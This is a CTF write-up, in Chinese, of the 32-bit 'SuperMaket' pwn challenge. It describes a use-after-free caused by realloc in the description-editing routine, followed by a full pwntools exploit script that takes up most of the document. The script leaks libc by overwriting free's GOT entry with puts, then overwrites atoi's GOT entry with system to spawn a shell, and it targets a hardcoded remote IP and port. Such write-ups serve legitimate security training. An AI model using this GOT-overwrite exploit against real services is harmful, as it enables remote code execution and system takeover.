# SuperMaket

### 漏洞点:

添加和删除基本上没有十分严密, 找不到漏洞, 输入的长度且必须是n - 1, 不存在 off by one.然而在修改description的时候,当新的大小与以前大小不同时, 就会realloc重新分配内存.但没有跟新list数组中的指针.若重新分配大的话, 就造成use after free.

简要说一下 realloc函数吧:

extern void *realloc(void *mem_address, unsigned int newsize);

realloc会根据newsize大小来判断怎样分配新的内存, 并却将原来的数据拷贝到新分配的内存中.

realloc包含了 malloc, free, memcpy三个函数功能, 若新的大小过大的时候, 且在相邻chunk没有空间可分配, 这时候,系统就会去找一个空间够的地方来开辟内存, 这时候就可能涉及到这三个函数的功能. malloc新的内存, mcmcpy拷贝数据, free掉以前的chunk.



### 漏洞代码:

```c++
for ( size = 0; size <= 0 || size > 256; size = inputNum() )
    printf("descrip_size:");
  if ( *((_DWORD *)(&list_0)[v1] + 5) != size )
    realloc(*((void **)(&list_0)[v1] + 6), size); //漏洞点
  printf("description:");
  return inputName(*((_DWORD *)(&list_0)[v1] + 6), *((_DWORD *)(&list_0)[v1] + 5));
}
```

### 整体思路:

#### 获得libc的基地址:

利用这个漏洞来修改free函数的got表为puts, 传入参数为atoi函数的got地址.调用free时, 获得atoi在libc中的地址.计算偏移即可

#### 调用system.

获得libc地址之后, 也利用这个漏洞修改atoi的got表地址为system地址.然后在进行选择的时候直接传入参数 '/bin/sh'即可获得shell.当然还可以继续修改free的got地址为system.但需要得到'/bin/sh'在libc中的地址, 且在chunk头的decription地址中写入该地址.调用free也行, 我试过了, system虽然能调用成功, 就是这个'/bin/sh'在libc中的偏移有问题. 结果 就是sh :cmd not found

以上就是整体思路:

#### exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "supermarket"
libFile  = "libc.so.6"

remoteIp = "111.198.29.45"
remotePort = 57966

LOCAL = 0
LIBC  = 1

r   =  lambda x : io.recv(x)
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(index, size, text):
	sla('>> ', str(1))
	sla(':', str(index))
	sla(':', str(0))
	sla(':', str(size))
	sla(':', text)

def rm(index):
	sla('>> ', str(2))
	sla(':', str(index))

def dp():
	sla('>> ', str(3))	

def md(index, size, text):
	sla('>> ', str(5))	
	sla(':', str(index))
	sla(':', str(size))
	sla(':', text)

def q():
	sa('>> ', str(6))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0, 0x80, '0' * (0x80 - 1))
	ad(1, 0x10, '1' * (0x10 - 1))
	md(0, 0x90, '') #不要向free掉的数据块中写入数据. 不然后期无法malloc
	ad(2, 0x10, '2' * (0x10 - 1))
	p = p32(0x32) + p32(0) * 4
	p += p32(0x10) + p32(exe.got['free'])
	p += '\x19'
	md(0, 0x80, p) # modify dscription addr as free got addr
	p2 = p32(exe.plt['puts'])
	md(2, 0x10, p2) #modify free got addr as puts got addr

	# leaking
	p3 = p32(0x32) + p32(0) * 4
	p3 += p32(0x10) + p32(exe.got['atoi'])
	p3 += '\x19'
	md(0, 0x80, p3)

	rm(2) #puts atoi addr in libc
	atoi_addr = u32(r(4))
	li('libc_base: ' + hex(atoi_addr))
	libc_base = atoi_addr - lib.sym['atoi']
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	sh_addr = libc_base + 0x0015902b

	#modify got addr as system
	ad(3, 0x10, '3' * (0x10 - 1))

	p4 = p32(0x32) + p32(0) * 4
	p4 += p32(0x10) + p32(0x0)
	p4 += p32(0x19) + p32(0x0) * 5
	
	p4 += p32(0x21) # modify item 3

	p4 += p32(0x33) #3
	p4 += p32(0x0) * 4
	p4 += p32(0x10)
	p4 += p32(exe.got['atoi']) + '\x19'
	
	md(0, 0x80, p4)
	

	p5 = p32(sys_addr)
	md(3, 0x10, p5) # modify atoi got table as system

	#db()
	
	# call system with /bin/sh
	sla('>> ', '/bin/sh')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	exe = ELF(exeFile)
	if LOCAL:
		if LIBC:
			lib = ELF('/lib/i386-linux-gnu/libc.so.6')
		#io = exe.process(env = {"LD_PRELOAD" : libFile})
		io = exe.process()
	
	else:
		io = remote(remoteIp, remotePort)
		if LIBC:
			lib = ELF(libFile)
	
	exploit()
	finish()
```

